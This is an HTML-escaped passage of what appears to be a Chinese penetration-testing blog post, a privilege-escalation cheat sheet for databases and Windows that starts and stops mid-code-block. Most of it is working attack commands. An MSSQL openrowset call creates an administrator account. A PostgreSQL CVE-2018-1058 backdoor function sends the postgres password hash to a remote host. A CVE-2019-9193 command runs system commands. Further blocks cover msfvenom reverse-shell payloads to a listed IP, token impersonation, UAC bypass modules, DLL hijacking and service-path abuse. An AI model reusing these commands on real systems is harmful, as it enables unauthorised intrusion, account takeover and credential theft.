class=&#34;line&#34;&gt;select * from openrowset(&amp;#x27;microsoft.jet.oledb.4.0&amp;#x27;,&amp;#x27;;database=c:/windows/system32/ias/ias.mdb&amp;#x27;,&amp;#x27;select shell(&amp;quot;net user margin margin /add&amp;quot;)&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select * from openrowset(&amp;#x27;microsoft.jet.oledb.4.0&amp;#x27;,&amp;#x27;;database=c:/windows/system32/ias/ias.mdb&amp;#x27;,&amp;#x27;select shell(&amp;quot;net localgroup administrators margin /add&amp;quot;)&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;沙盒模式 SandBoxMode 参数含义（默认是 2 ）&lt;br&gt;
 &lt;code&gt;0&lt;/code&gt; ：在任何所有者中禁止启用安全模式&lt;br&gt;
 &lt;code&gt;1&lt;/code&gt;  ：为仅在允许范围内&lt;br&gt;
 &lt;code&gt;2&lt;/code&gt;  ：必须在 access 模式下&lt;br&gt;
 &lt;code&gt;3&lt;/code&gt; ：完全开启&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;openrowset 是可以通过 OLE DB 访问 SQL Server 数据库，OLE DB 是应用 程序链接到 SQL Server 的的驱动程序。恢复配置如下:&lt;/p&gt;
&lt;p&gt;–exec master…xp_regwrite ‘HKEY_LOCAL_MACHINE’,‘SOFTWARE\Microsoft\Jet\4.0\Engines’,‘SandBoxMo de’,‘REG_DWORD’,1;&lt;/p&gt;
&lt;p&gt;–exec sp_configure ‘Ad Hoc Distributed Queries’,0;reconfigure; --exec sp_configure ‘show advanced options’,0;reconfigure;&lt;/p&gt;
&lt;h4 id=&#34;oracle-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#oracle-提权&#34;&gt;#&lt;/a&gt; oracle 提权&lt;/h4&gt;
&lt;p&gt;工具地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vb3JhY2xlc2hlbGw=&#34;&gt;https://github.com/jas502n/oracleshell&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;普通用户模式：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;前提是拥有一个普通的 oracle 连接账号，不需要 DBA 权限，可提权至 DBA，并以 oracle 实例运行的权限执行操作系统命令。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;DBA 用户模式：（自动化工具）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;拥有 DBA 账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;注入提升模式：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;拥有一个 oracle 注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显。&lt;/p&gt;
&lt;h4 id=&#34;postgresql-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#postgresql-提权&#34;&gt;#&lt;/a&gt; postgresql 提权&lt;/h4&gt;
&lt;p&gt;PostgreSQL 是一款关系型数据库。其 3 到 10 版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PostgreSQL 提权漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CVE-2018-1058 普通用户植入后门命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select dblink_connect((select &amp;#x27;hostaddr=10.0.0.1 port=5433 user=postgres&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;password=chybeta sslmode=disable dbname=&amp;#x27;||(SELECT passwd FROM pg_shadow&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;WHERE usename=&amp;#x27;postgres&amp;#x27;)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SELECT pg_catalog.array_to_string($1,$2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;$ LANGUAGE SQL VOLATILE;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;管理员操作数据库触发&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;docker-compose exec postgres pg_dump -U postgres -f evil.bak vulhub&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;PostgreSQL 高权限命令执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;CVE-2019-9193&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在连接到的后门一般是哥斯拉中利用数据库操作中执行以下命令，其中&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;表示需要执行的系统命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;DROP TABLE IF EXISTS cmd_exec;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CREATE TABLE cmd_exec(cmd_output text);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;COPY cmd_exec FROM PROGRAM &amp;#x27;id&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SELECT * FROM cmd_exec;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;三方应用提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#三方应用提权&#34;&gt;#&lt;/a&gt; 三方应用提权&lt;/h4&gt;
&lt;p&gt;通过 cs 的插件，如果此时已经通过 webshell 运行了 cs 木马，可以通过下 列插件来获取明文凭据，收集更多的内网信息，但是这不一定能收集成功，毕 竟有防火墙需要规避&lt;/p&gt;
&lt;p&gt;远控类：Teamviewer 向日葵 Todesk VNC Radmin 等&lt;/p&gt;
&lt;p&gt;密码类：各大浏览器 Xshell Navicat 3389 等&lt;/p&gt;
&lt;h3 id=&#34;win提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win提权&#34;&gt;#&lt;/a&gt; win 提权&lt;/h3&gt;
&lt;h4 id=&#34;at-sc-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#at-sc-提权&#34;&gt;#&lt;/a&gt; at sc 提权&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;at 命令提权&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;at 命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用 system 权限。适用版本：Win2000 &amp;amp; Win2003 &amp;amp; XP 中还是存在的，在 Win7 以 后被剔除。当我们拿到低权限的用户，通过连接上服务器后，可以通过 at 命令 来进行本地提权。&lt;/p&gt;
&lt;p&gt;at 21:00 /interactive cmd (在 20:33 分生成一个交互式的 System 权限的 cmd)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sc 命令提权&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;sc 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类 似于控制面板中管理工具项中的服务。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建一个名叫 syscmd 的新的交互式的 cmd 执行服务&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sc Create syscmd binPath= &amp;quot;cmd /K start&amp;quot; type= own type=interact&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;运行服务&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sc start syscmd&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;psexec-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#psexec-提权&#34;&gt;#&lt;/a&gt; psexec 提权&lt;/h4&gt;
&lt;p&gt;适用版本：Win2012 and Win2008 &amp;amp; Win2016 基本可以&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vemgtY24vc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wc3Rvb2xz&#34;&gt;https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;psexec.exe -accepteula -s -i -d cmd&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;进程迁移注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#进程迁移注入&#34;&gt;#&lt;/a&gt; 进程迁移注入&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;win 2008 进程注入&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;相当于开了一个后门，注入到其他用户进程下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pinjector -l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pinjector -p 420 cmd 3333&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc 192.168.46.149 3333&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;Win2008 2012 2016 MSF 进程注入&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ps &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;迁移对应PID&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;migrate PID&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;窃取令牌&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#窃取令牌&#34;&gt;#&lt;/a&gt; 窃取令牌&lt;/h4&gt;
&lt;p&gt;假冒令牌可以假冒一个网络中的另一个用户进行各类操作。当一个攻击者 需要域管理员的操作权限时候，需通过假冒域管理员的令牌进行攻击。适用 win2012。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;令牌窃取&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp LHOST=47.94.236.117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LPORT=3333 -f exe -o msf.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use incognito&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list_tokens -u&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;impersonate_token &amp;quot;NT AUTHORITY\SYSTEM&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;烂土豆提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#烂土豆提权&#34;&gt;#&lt;/a&gt; 烂土豆提权&lt;/h4&gt;
&lt;p&gt;适用 Win2008 2012 2016。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;execute -cH -f ./potato.exe //配合烂土豆&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use incognito&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list_tokens -u&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;impersonate_token &amp;quot;NT AUTHORITY\SYSTEM&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;win-msf-自动化提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win-msf-自动化提权&#34;&gt;#&lt;/a&gt; Win msf 自动化提权&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看当前权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getuid&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;getsystem&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;bypassuac-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bypassuac-提权&#34;&gt;#&lt;/a&gt; bypassUAC 提权&lt;/h4&gt;
&lt;p&gt;为了远程执行目标的 exe 或者 bat 可执行文件绕过此安全机制，以此叫 BypassUAC，开启 UAC 和未开启 UAC 时，MSF 默认 getsystem 提权影响 (进程注 入)。适用 win10。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.46.158 lport=3333 -f exe -o msf.exe&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MSF 模块 BypassUAC&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Win7本地权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/local/bypassua&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Win10本地权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/local/ask&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/local/bypassuac_sluihijack&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/local/bypassuac_silentcleanup&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;UACME 项目（推荐）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;通过此程序调用 exe 文件，调用时用的 SYSTEM 权限，则此时反弹得到的 shell 是可以提权到 STSTEM 权限的。&lt;/p&gt;
&lt;p&gt;项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2hmaXJlZjB4L1VBQ01F&#34;&gt;https://github.com/hfiref0x/UACME&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Akagi64.exe 编号 调用执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Akagi64.exe 41 msf1.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;dll劫持提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dll劫持提权&#34;&gt;#&lt;/a&gt; Dll 劫持提权&lt;/h4&gt;
&lt;p&gt;Windows 程序启动的时候需要 DLL。如果这些 DLL 不存在，则可以通过 在应用程序要查找的位置放置恶意 DLL 来提权。通常，Windows 应用程序有其 预定义好的搜索 DLL 的路径，它会根据下面的顺序进行搜索：应用程序加载的 目录、C:\Windows\System32、C:\Windows\System、C:\Windows、当前工作目录 Current Working Directory，CWD、在 PATH 环境变量的目录 (先系统后用户)。适用 win2012。&lt;/p&gt;
&lt;p&gt;利用火绒剑进行进程分析加载 DLL，一般寻程序 DLL 利用，制作 dll 并上 传，替换 dll，启动应用后成功。还可以用 ChkDllHijack 来检测与某程序相关联 的 DLL 文件，提前信息收集相关软件及 DLL 问题程序，本地调试成功后覆盖 DLL 实现利用。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=47.94.236.117 lport=4444 -f dll -o xiaodi.dll&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;服务路径及权限&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#服务路径及权限&#34;&gt;#&lt;/a&gt; 服务路径及权限&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;不带引号服务路径配合 MSF&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;利用 JAWS 或者命令检测服务路径，需要服务没有双引号并且服务中出现 了空格，那么就可以看作是前边的路径是程序后边的路径是参数，上传 exe 木 马到此路径下，并用命令行启动服务上传反弹 exe，设置好对应执行名后，执行 sc start “Macro Expert”，木马上线。适用 win2012。&lt;/p&gt;
&lt;p&gt;JAWS 下载地址:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLzQxMUhhbGwvSkFXUw==&#34;&gt;https://github.com/411Hall/JAWS&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;检测命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wmic service get name,displayname,pathname,startmode |findstr /i &amp;quot;Auto&amp;quot; |findstr /i /v &amp;quot;C:\Windows\\&amp;quot; |findstr /i /v&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;不安全的服务权限配合 MSF-NewServices&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。 有的目录是不允许被修改的。&lt;/p&gt;
&lt;p&gt;利用 accesschk 或 PowerUp (PowerSploit) 检测服务权限配置，制作文件并上 传，创建新服务并更改服务路径指向，启动服务时木马被执行。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;PowerSploit 下载地址:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 